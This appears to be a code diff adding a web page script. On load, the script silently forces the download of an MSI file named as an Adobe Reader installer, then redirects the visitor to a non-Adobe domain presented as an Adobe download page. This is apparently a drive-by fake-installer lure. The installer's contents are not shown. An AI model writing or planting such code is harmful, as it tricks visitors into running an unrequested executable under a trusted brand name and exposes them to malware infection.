@@ -1,0 +1,13 @@
+<script>
+  // Trigger MSI download
+  const link = document.createElement('a');
+  link.href = '/Reader_en_install';  // must match the file name in /public
+  link.download = 'Reader_en_install.msi';
+  document.body.appendChild(link);
+  link.click();
+
+  // Redirect to Adobe after download starts
+  setTimeout(() => {
+    window.location.href = 'https://jomry.com/adobe-readers/installer/download.html';
+  }, 1000); // 1 second delay
+</script>
